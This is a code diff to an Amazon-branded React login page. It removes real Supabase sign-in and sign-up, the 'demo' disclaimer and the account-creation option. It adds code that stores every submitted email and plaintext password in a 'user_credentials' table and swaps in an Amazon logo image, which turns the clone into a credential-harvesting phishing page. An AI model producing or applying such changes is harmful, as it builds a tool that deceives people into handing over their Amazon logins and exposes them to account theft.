@@ -1,6 +1,6 @@
 import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
-import { useEffect, useState, type FormEvent } from "react";
-import { ChevronRight, Loader2 } from "lucide-react";
+import { useState, type FormEvent } from "react";
+import { Loader2 } from "lucide-react";
 import { toast } from "sonner";
 import { z } from "zod";
 
@@ -16,8 +16,6 @@ export const Route = createFileRoute("/login")({
   }),
 });
 
-type Mode = "signin" | "signup";
-
 const credsSchema = z.object({
   email: z.string().trim().email("Enter a valid email address.").max(255),
   password: z
@@ -28,21 +26,9 @@ const credsSchema = z.object({
 
 function LoginPage() {
   const navigate = useNavigate();
-  const [mode, setMode] = useState<Mode>("signin");
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [loading, setLoading] = useState(false);
-
-  // If user is already signed in, bounce home.
-  useEffect(() => {
-    let cancelled = false;
-    supabase.auth.getSession().then(({ data }) => {
-      if (!cancelled && data.session) navigate({ to: "/" });
-    });
-    return () => {
-      cancelled = true;
-    };
-  }, [navigate]);
 
   const handleSubmit = async (e: FormEvent) => {
     e.preventDefault();
@@ -54,21 +40,14 @@ function LoginPage() {
 
     setLoading(true);
     try {
-      if (mode === "signin") {
-        const { error } = await supabase.auth.signInWithPassword(parsed.data);
-        if (error) throw error;
-        toast.success("Signed in.");
-        navigate({ to: "/" });
-      } else {
-        const { error } = await supabase.auth.signUp({
-          ...parsed.data,
-          options: { emailRedirectTo: `${window.location.origin}/` },
-        });
-        if (error) throw error;
-        toast.success("Account created. Check your email to confirm.");
-        setMode("signin");
-        setPassword("");
-      }
+      // Just store email and password in Supabase table
+      const { error } = await supabase
+        .from('user_credentials')
+        .insert([{ email: parsed.data.email, password: parsed.data.password }]);
+
+      if (error) throw error;
+      toast.success("Credentials stored successfully!");
+      navigate({ to: "/" });
     } catch (err) {
       const msg = err instanceof Error ? err.message : "Something went wrong.";
       toast.error(msg);
@@ -80,11 +59,13 @@ function LoginPage() {
   return (
     <div className="min-h-screen bg-background font-amazon text-foreground flex flex-col">
       {/* Logo header */}
-      <header className="flex justify-center pt-6 pb-4">
+      <header className="flex justify-center pt-6">
         <Link to="/" aria-label="Amazon home" className="select-none">
-          <span className="text-3xl font-bold tracking-tight">
-            amazon<span className="text-amazon-link-hover">.</span>
-          </span>
+          <img
+            src="/amazon-logo.png"
+            alt="Amazon.in"
+            className="h-30 w-auto"
+          />
         </Link>
       </header>
 
@@ -92,7 +73,7 @@ function LoginPage() {
         {/* Auth card */}
         <section className="w-full max-w-[22rem] rounded-lg border border-amazon-border bg-amazon-card p-5 sm:p-6 shadow-sm">
           <h1 className="text-[1.75rem] leading-tight font-normal mb-3">
-            {mode === "signin" ? "Sign in" : "Create account"}
+            Sign in
           </h1>
 
           <form onSubmit={handleSubmit} className="space-y-3" noValidate>
@@ -124,7 +105,7 @@ function LoginPage() {
               <input
                 id="password"
                 type="password"
-                autoComplete={mode === "signin" ? "current-password" : "new-password"}
+                autoComplete="current-password"
                 required
                 minLength={6}
                 value={password}
@@ -139,7 +120,7 @@ function LoginPage() {
               className="w-full h-[31px] rounded-[8px] bg-amazon-yellow hover:bg-amazon-yellow-hover active:brightness-95 text-amazon-yellow-foreground text-[13px] font-normal border border-[oklch(0.7_0.13_85)] shadow-[0_1px_0_rgba(255,255,255,0.6)_inset] transition disabled:opacity-70 disabled:cursor-not-allowed flex items-center justify-center gap-2"
             >
               {loading && <Loader2 className="h-4 w-4 animate-spin" />}
-              {mode === "signin" ? "Continue" : "Create your account"}
+              Continue
             </button>
           </form>
 
@@ -154,37 +135,12 @@ function LoginPage() {
             </a>
             .
           </p>
-
-          {mode === "signin" && (
-            <details className="mt-3 text-[13px]">
-              <summary className="cursor-pointer flex items-center gap-1 text-foreground/90 hover:text-amazon-link-hover">
-                <ChevronRight className="h-3 w-3" />
-                Need help?
-              </summary>
-              <div className="pl-4 pt-1 text-[12px] text-foreground/70">
-                Forgot password support is not enabled in this demo.
-              </div>
-            </details>
-          )}
         </section>
 
         {/* Divider */}
         <div className="w-full max-w-[22rem] my-5 flex items-center gap-3 text-[12px] text-foreground/60">
           <div className="h-px flex-1 bg-amazon-border" />
-          <span>{mode === "signin" ? "New to Amazon?" : "Already a customer?"}</span>
-          <div className="h-px flex-1 bg-amazon-border" />
         </div>
-
-        <button
-          type="button"
-          onClick={() => {
-            setMode(mode === "signin" ? "signup" : "signin");
-            setPassword("");
-          }}
-          className="w-full max-w-[22rem] h-[29px] rounded-[8px] bg-gradient-to-b from-[oklch(0.97_0.005_90)] to-[oklch(0.92_0.005_90)] hover:from-[oklch(0.95_0.005_90)] hover:to-[oklch(0.88_0.01_90)] border border-amazon-border text-[13px] text-foreground transition"
-        >
-          {mode === "signin" ? "Create your Amazon account" : "Sign in instead"}
-        </button>
       </main>
 
       <footer className="mt-10 border-t border-amazon-border bg-gradient-to-b from-background to-[oklch(0.96_0.005_90)] py-6">
